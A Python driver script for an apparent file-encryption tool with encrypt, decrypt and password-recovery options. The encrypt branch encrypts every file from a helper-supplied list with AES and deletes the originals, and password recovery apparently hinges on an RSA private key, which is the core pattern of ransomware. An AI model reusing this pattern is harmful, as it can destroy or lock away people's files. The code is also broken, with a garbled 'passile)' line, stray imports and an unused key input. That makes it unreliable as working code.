from tkinter import E
import aes
import rsa
import files
import gen_pass
import base64
import os
import enc_Pass
import os

def Main():
    #encrypt files and decrypt files
    choice = input("Would you like to (E)ncrypt of (D)ecrypt or (P)assword?: ").upper()

    if choice == 'E':
        password =enc_Pass.gen() 
        for i in files.getfiles_enc():
            file_name = i.split("/")[-1]
            print(file_name)
            file_path = i.replace(file_name, "")
            os.chdir(file_path)
            aes.encrypt(aes.getKey(password),file_name)
            try:
                os.remove(file_name)
            except OSError:
                passile)
        Main()

    elif choice == 'D':
        password = input("Password: ")
        for i in files.getfiles_dec():
            name = i.split("/")[-1]
            print(name)
            path = i.replace(name, "")
            os.chdir(path)
            aes.decrypt(aes.getKey(password), name)
            os.remove(name)
        print("Done.")

    elif choice == 'P':
        choice1 =input("Did you encrypt the files already? in order to get the current password \n (Y)es / (N)o\n").upper()
        if choice1 =='Y':
            priv= input("You need to input the private key in order to decrypt the files")
            f = open('password.txt', 'r')
            file_contents = f.read()
            print("The password to your files is: : \n\n-",file_contents)
            f.close()
            Main()
        elif choice1 == 'N':
            Main()

    else:
        print("No option selected, closing...")
